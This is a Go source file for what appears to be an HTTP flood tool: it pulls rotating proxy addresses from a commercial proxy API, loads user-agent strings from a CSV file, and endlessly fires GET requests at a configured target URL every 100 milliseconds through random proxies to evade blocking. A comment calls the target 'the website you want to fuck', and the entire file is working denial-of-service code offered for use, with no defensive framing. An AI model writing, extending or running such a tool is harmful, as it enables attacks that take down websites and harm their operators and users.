package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"github.com/BillSJC/go-curl"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_KEY        = "your api key"                   //your API AppKey
	API_SECRET_MD5 = "your api secret (After MD5 16)" //you API Secret (after MD5)
	TARGET_URL     = "website u want to fuck"         //the website you want to fuck
	FREQUENCY      = 100                              // frequency (ms)
)

var ips []string
var uas []string
var iplen, ualen, count int

type ipdata struct {
	Code string
	Msg  string
	Data struct {
		Count     int
		ProxyList []struct {
			Ip   string
			Port int
		} `json:"proxy_list"`
	}
}

func getIP() {
	urls := "http://www.zdopen.com/ShortProxy/GetIP/?api=" + API_KEY + "&akey=" + API_SECRET_MD5 + "&count=5&order=2&type=3"
	resp, err := curl.NewRequest().SetUrl(urls).Get()
	if err != nil {
		panic(err)
	}
	d := new(ipdata)
	err = json.Unmarshal([]byte(resp.Body), d)
	if err != nil {
		panic(err)
	}
	list := make([]string, 0, 6)
	for _, v := range d.Data.ProxyList {
		list = append(list, fmt.Sprintf("%s:%d", v.Ip, v.Port))
	}
	ips = list
	iplen = len(ips)
}

func main() {
	count = 0
	bindIPExec()
	getIP()
	go bindIP()
	readCSV()
	go refershIP()
	time.Sleep(time.Second * 1)
	rush()
}

func rush() {
	for true {
		time.Sleep(time.Millisecond * FREQUENCY)
		ipt := getRandomIP()
		uat := getRandomUA()
		go httpproxy(ipt, uat, TARGET_URL)
	}
}

func refershIP() {

	for true {
		time.Sleep(time.Second * 10)
		getIP()
	}
}

func ReadLine(fileName string, handler func(string)) error {
	f, err := os.Open(fileName)
	if err != nil {
		return err
	}
	buf := bufio.NewReader(f)
	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		handler(line)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return err
		}
	}
	return nil
}

func readCSV() {
	ReadLine("data.csv", addLine)
	ualen = len(uas)
}

func addLine(s string) {
	uas = append(uas, s)
}

func getRandomIP() string {
	return ips[rand.Int()%iplen]
}

func getRandomUA() string {
	return uas[rand.Int()%ualen]
}

func httpproxy(proxy string, ua string, target string) {
	urli := url.URL{}
	urlproxy, _ := urli.Parse("http://" + proxy)
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(urlproxy),
		},
	}
	rqt, err := http.NewRequest("GET", target, nil)
	if err != nil {
		println("接口获取IP失败!")
		return
	}
	rqt.Header.Add("User-Agent", ua)
	//处理返回结果
	response, err := client.Do(rqt)
	if err != nil {
		fmt.Println(err)
	} else {
		defer response.Body.Close()
	}
	count++
	fmt.Println(count)
	return

}

func bindIP() {
	for true {
		bindIPExec()
		time.Sleep(time.Minute * 2)
	}

}

//bind ip mode
func bindIPExec() {
	urls := "http://www.zdopen.com/ShortProxy/BindIP/?api=" + API_KEY + "&akey=" + API_SECRET_MD5 + "&i=1"
	resp, err := curl.NewRequest().SetUrl(urls).Get()
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(resp.Body)
	}
}
